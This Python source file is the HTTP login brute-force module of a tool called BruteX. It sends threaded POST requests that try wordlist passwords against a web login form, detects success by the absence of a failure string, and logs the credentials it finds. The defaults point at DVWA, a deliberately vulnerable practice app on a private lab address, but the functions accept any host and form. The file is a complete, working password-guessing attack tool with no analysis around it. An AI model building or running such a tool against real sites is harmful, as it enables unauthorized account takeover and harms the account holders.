# http_brute.py — HTTP login brute force module for BruteX

import urllib.request
import urllib.parse
import threading
from queue  import Queue
from logger import log, log_success

THREAD_COUNT = 15
TIMEOUT      = 5

found      = False
found_lock = threading.Lock()

def try_http(host, port, path, user_field,
             pass_field, username, password,
             fail_string, results):
    """Try a single HTTP POST login attempt."""
    global found

    if found:
        return

    try:
        url  = f"http://{host}:{port}{path}"
        data = urllib.parse.urlencode({
            user_field: username,
            pass_field: password
        }).encode()

        req      = urllib.request.Request(url, data=data)
        response = urllib.request.urlopen(req, timeout=TIMEOUT)
        content  = response.read().decode("utf-8", errors="ignore")

        # If fail string not in response — login succeeded!
        if fail_string not in content:
            with found_lock:
                found = True
            log(f"Trying {username}:{password} → SUCCESS!", "SUCCESS")
            log_success(host, port, "HTTP", username, password)
            results.append((username, password))
        else:
            log(f"Trying {username}:{password} → FAILED", "FAIL")

    except Exception as e:
        log(f"HTTP error: {str(e)}", "ERROR")


def worker(host, port, path, user_field,
           pass_field, username, queue,
           fail_string, results):
    """Thread worker for HTTP brute force."""
    while not queue.empty() and not found:
        password = queue.get()
        try_http(host, port, path, user_field,
                 pass_field, username, password,
                 fail_string, results)
        queue.task_done()


def http_brute(host, port, path, user_field,
               pass_field, username, passwords,
               fail_string="incorrect"):
    """
    Main HTTP brute force function.
    Returns (username, password) if found, None otherwise.
    """
    global found
    found = False

    queue   = Queue()
    results = []
    threads = []

    log(f"Starting HTTP brute force on {host}:{port}{path}", "INFO")
    log(f"Target user: {username}", "INFO")
    log(f"Trying {len(passwords)} passwords...\n", "INFO")

    for p in passwords:
        queue.put(p)

    for _ in range(min(THREAD_COUNT, len(passwords))):
        t = threading.Thread(
            target=worker,
            args=(host, port, path, user_field,
                  pass_field, username, queue,
                  fail_string, results)
        )
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if results:
        return results[0]
    return None


if __name__ == "__main__":
    import sys
    from wordlist_gen import get_wordlist

    host     = sys.argv[1] if len(sys.argv) > 1 else "192.168.56.200"
    port     = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    username = sys.argv[3] if len(sys.argv) > 3 else "admin"
    wordlist = sys.argv[4] if len(sys.argv) > 4 else None

    # DVWA login settings
    path        = "/dvwa/login.php"
    user_field  = "username"
    pass_field  = "password"
    fail_string = "Login failed"

    passwords = get_wordlist(wordlist, username)
    result    = http_brute(host, port, path, user_field,
                           pass_field, username,
                           passwords, fail_string)

    if result:
        print(f"\n[+] SUCCESS! {username}:{result[1]}")
    else:
        print(f"\n[-] Password not found for {username}")